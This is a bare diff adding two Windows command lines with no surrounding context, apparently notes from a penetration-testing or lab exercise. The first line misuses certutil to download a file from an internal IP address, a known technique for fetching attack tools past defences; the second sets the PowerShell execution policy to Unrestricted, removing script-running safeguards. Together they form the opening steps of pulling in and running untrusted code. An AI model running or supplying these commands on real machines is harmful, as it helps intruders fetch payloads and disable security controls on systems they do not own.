@@ -1,0 +1,3 @@
+certutil -urlcache -split -f http://192.168.88.50/smith.txt web.txt
+
+Set-ExecutionPolicy Unrestricted
